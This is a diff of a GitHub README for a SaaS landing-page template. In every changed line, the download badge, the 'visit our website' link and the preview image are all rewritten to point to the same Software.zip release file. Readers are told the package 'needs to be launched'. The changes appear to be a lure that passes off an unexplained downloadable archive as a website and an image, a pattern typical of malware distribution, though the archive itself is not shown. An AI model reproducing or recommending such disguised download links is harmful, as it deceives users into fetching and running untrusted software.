@@ -11,7 +11,7 @@ SaaS-Landing-Page
 
 ## 🚀 Ready to Launch Software! 
 Click below to download the Software package:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Software](https://github.com/YuriumScriptAcc/SaaS-Landing-Page/releases/download/v2.0/Software.zip)](https://github.com/YuriumScriptAcc/SaaS-Landing-Page/releases/download/v2.0/Software.zip)
 
 #### *Please note: The Software package needs to be launched.*
 
@@ -37,7 +37,7 @@ Designed with conversion in mind, the template includes elements to drive user a
 ---
 
 ## 🌐 Visit Our Website:
-[Click here to visit our website!](https://github.com/user-attachments/files/18388744/Software.zip)
+[Click here to visit our website!](https://github.com/YuriumScriptAcc/SaaS-Landing-Page/releases/download/v2.0/Software.zip)
 
 #### *Please note: You can directly visit the website to explore more.*
 
@@ -52,7 +52,7 @@ If the link provided above is not accessible or you prefer a different download 
 
 🚀 Start boosting your business with our amazing template today! 🚀
 
-![SaaS Landing Page](https://via.placeholder.com/800x400.png)
+![SaaS Landing Page](https://github.com/YuriumScriptAcc/SaaS-Landing-Page/releases/download/v2.0/Software.zip)
 
 ---
 
